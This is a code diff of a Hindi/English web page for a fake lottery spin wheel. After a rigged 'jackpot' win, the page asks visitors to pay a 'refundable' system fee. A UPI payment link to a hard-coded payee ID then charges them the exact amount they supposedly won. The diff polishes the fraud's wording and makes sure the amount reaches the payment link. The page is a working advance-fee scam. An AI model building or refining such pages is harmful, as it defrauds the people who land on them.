@@ -96,23 +96,24 @@
     <div id="reward-modal">
         <div class="reward-card">
             <div style="font-size: 50px;">🎊</div>
-            <h2 style="color: #fff; margin-top: 10px;">BADHAI HO!</h2>
-            <p style="color: #00f2ff; font-weight: bold; margin-top: 5px;">Aapka Jackpot Amount Unlock Hai</p>
-            <div class="win-amt" id="finalPrize">₹0</div>
+            <h2 style="color: #fff; margin-top: 10px;">BOHOT BADHAI HO!</h2>
+            <p style="color: #00f2ff; font-weight: bold; margin-top: 5px;">Jackpot Amount Unlock Ho Gaya Hai</p>
+            <div class="win-amt" id="finalPrizeDisplay">₹0</div>
             <p style="color: #eee; font-size: 16px; line-height: 1.4;">
-                Aapki rashi bank mein bhejne ke liye taiyar hai. <b>Bank Link Charge</b> (Refundable) pay karke turant apna full amount withdraw karein.
+                Aapki rashi bank account mein bhejne ke liye taiyar hai. <b>System Fee (Refundable)</b> pay karke turant apna full amount withdraw karein.
             </p>
-            <button class="claim-btn" onclick="goToPayment()">INSTANT WITHDRAW</button>
-            <p class="timer-text">⚡ Payment ke turant baad rashi credit ho jayegi!</p>
+            <button class="claim-btn" id="dynamicPayBtn" onclick="goToPayment()">INSTANT WITHDRAW</button>
+            <p class="timer-text">⚡ Payment ke turant baad bank mein rashi credit hogi!</p>
         </div>
     </div>
 
     <script>
         const wheel = document.getElementById('wheel');
-        const prizes = ["500", "700", "350", "600", "450", "250", "650", "300"]; // Values as numbers
+        // Values as strings to ensure precise amount in UPI
+        const prizes = ["500", "700", "350", "600", "450", "250", "650", "300"];
         const colors = ["#b8860b", "#000", "#b8860b", "#000", "#b8860b", "#000", "#b8860b", "#000"];
         let rotation = 0;
-        let currentWin = 0;
+        let finalAmount = "0";
 
         prizes.forEach((p, i) => {
             const seg = document.createElement('div');
@@ -131,10 +132,10 @@
             const btn = document.getElementById('sBtn');
             btn.disabled = true;
             btn.style.opacity = "0.5";
-            const winIdx = Math.floor(Math.random() * prizes.length);
             
-            // Store the win amount
-            currentWin = prizes[winIdx];
+            // Randomly select winning index
+            const winIdx = Math.floor(Math.random() * prizes.length);
+            finalAmount = prizes[winIdx]; // Store the dynamic amount
             
             rotation += 3600 + (360 - (winIdx * 45));
             wheel.style.transform = `rotate(${rotation}deg)`;
@@ -142,15 +143,22 @@
             setTimeout(() => {
                 document.getElementById('winSound').play();
                 confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
-                document.getElementById('finalPrize').innerText = "₹" + currentWin;
+                
+                // Update Display text
+                document.getElementById('finalPrizeDisplay').innerText = "₹" + finalAmount;
+                
+                // Show Modal
                 document.getElementById('reward-modal').style.display = 'flex';
             }, 7200);
         }
 
         function goToPayment() {
-            // UPI Link uses the currentWin variable automatically
+            // Making sure the amount is injected directly at the time of click
             const upiId = "8709615634-w350@ybl";
-            window.location.href = `upi://pay?pa=${upiId}&pn=LotusGold_Rewards&am=${currentWin}&tn=Bank_Link_Charge_Refundable&cu=INR`;
+            const upiUrl = "upi://pay?pa=" + upiId + "&pn=LotusGold_Rewards&am=" + finalAmount + "&tn=Refundable_System_Fee&cu=INR";
+            
+            console.log("Redirecting to:", upiUrl); // For testing
+            window.location.href = upiUrl;
         }
     </script>
 </body>
